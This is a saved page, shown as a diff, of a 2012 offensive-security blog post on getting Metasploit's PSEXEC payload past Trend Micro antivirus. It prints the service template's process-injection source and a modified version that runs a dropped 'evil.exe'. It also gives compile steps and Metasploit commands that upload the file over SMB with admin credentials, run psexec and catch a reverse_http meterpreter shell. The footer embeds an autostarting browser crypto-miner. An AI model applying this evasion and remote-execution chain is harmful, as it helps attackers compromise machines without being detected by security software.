@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Bypassing Trend Micro&#39;s Service Protection &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&#39;s Service Protection</a></h1>
+            <span class="post-date">Jul 5, 2012 </span>
+            <div class="post-content">
+                <p><a href="http://twitter.com/jabjorkhaug">@jabjorkhaug</a> posed the following question on Twitter today:</p>
+
+<p><img src="/images/postimages/201207_trendmicro_1.png" alt="" /></p>
+
+<p>I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:</p>
+
+<p><img src="/images/postimages/201207_trendmicro_2.png" alt="" /></p>
+
+<p>The service binary that is used as part of PSEXEC is located here:</p>
+
+<p>MSF Directory/data/templates/src/pe/exe/service/service.c</p>
+
+<p>The important part to look at starts at line 57:</p>
+
+<pre><code class="language-cpp">#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+
+#define PAYLOAD_SIZE	8192
+
+char cServiceName[32] = &quot;SERVICENAME&quot;;
+
+char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;;
+
+SERVICE_STATUS ss;
+
+SERVICE_STATUS_HANDLE hStatus = NULL;
+
+/*
+ *
+ */
+BOOL ServiceHandler( DWORD dwControl )
+{
+	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
+	{
+		ss.dwWin32ExitCode = 0;
+		ss.dwCurrentState  = SERVICE_STOPPED;
+	}
+	return SetServiceStatus( hStatus, &amp;ss );
+}
+
+/*
+ *
+ */
+VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
+{
+	CONTEXT Context;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	LPVOID lpPayload = NULL;
+
+	ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) );
+	ZeroMemory( &amp;si, sizeof(STARTUPINFO) );
+	ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) );
+
+	si.cb = sizeof(STARTUPINFO);
+
+	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+
+	ss.dwCurrentState = SERVICE_START_PENDING;
+
+	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
+
+	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
+  
+	if ( hStatus )
+	{
+		ss.dwCurrentState = SERVICE_RUNNING;
+
+		SetServiceStatus( hStatus, &amp;ss );
+
+		if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) )
+		{
+			Context.ContextFlags = CONTEXT_FULL;
+		  
+			GetThreadContext( pi.hThread, &amp;Context );
+		  
+			lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+			if( lpPayload )
+			{
+				WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL );
+#ifdef _WIN64
+				Context.Rip = (DWORD64)lpPayload;
+#else
+				Context.Eip = (DWORD)lpPayload;
+#endif
+				SetThreadContext( pi.hThread, &amp;Context );
+			}
+
+			ResumeThread( pi.hThread );
+			
+			CloseHandle( pi.hThread );
+		  
+			CloseHandle( pi.hProcess );
+		}
+		
+		ServiceHandler( SERVICE_CONTROL_STOP );
+		
+		ExitProcess( 0 );
+	}
+}
+
+/*
+ *
+ */
+int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
+{
+	SERVICE_TABLE_ENTRY st[] = 
+    { 
+        { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, 
+        { NULL, NULL } 
+    };
+	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st );
+}
+
+</code></pre>
+
+<p>It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&rsquo;t do any injection and just executes a binary. That removes the &lsquo;injection&rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.</p>
+
+<p>To make this change you replace the above with just this:</p>
+
+<pre><code class="language-cpp">if( CreateProcess( NULL, &quot;C:\evil.exe&quot;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;si, &amp;pi ) )
+{
+	CloseHandle( pi.hProcess );
+}
+</code></pre>
+
+<p>Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:</p>
+
+<pre><code>i386-mingw32-gcc -o service.exe service.c 
+</code></pre>
+
+<p>Then just copy it to replace the current one:</p>
+
+<pre><code>cp service.exe ../../../../template_x86_windows_svc.exe 
+</code></pre>
+
+<p>No other changes are needed. Only problem is, how do we get the &ldquo;evil.exe&rdquo; up onto the box for it to execute? That&rsquo;s where the auxiliary module &ldquo;auxiliary/admin/smb/upload_file&rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, <em>remove the comments for it to work</em>):</p>
+
+<p>Start Multi Handler</p>
+
+<pre><code>use multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+set ExitOnSession false
+exploit -j -z
+</code></pre>
+
+<p>Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)</p>
+
+<pre><code>use auxiliary/admin/smb/upload_file
+set LPATH evil.exe
+set RPATH evil.exe
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+run
+</code></pre>
+
+<p>Execute PSEXEC using the new service binary that simply executes</p>
+
+<pre><code>use exploit/windows/smb/psexec
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+set DisablePayloadHandler true
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+exploit -j -z
+</code></pre>
+
+<p>The passwords could have just as easily been hashes, and the end result is:</p>
+
+<p>Well I can&rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:</p>
+
+<pre><code> [*] Meterpreter session 2 opened (172.16.195.1:80 -&gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
+</code></pre>
+
+<p>w00t!</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
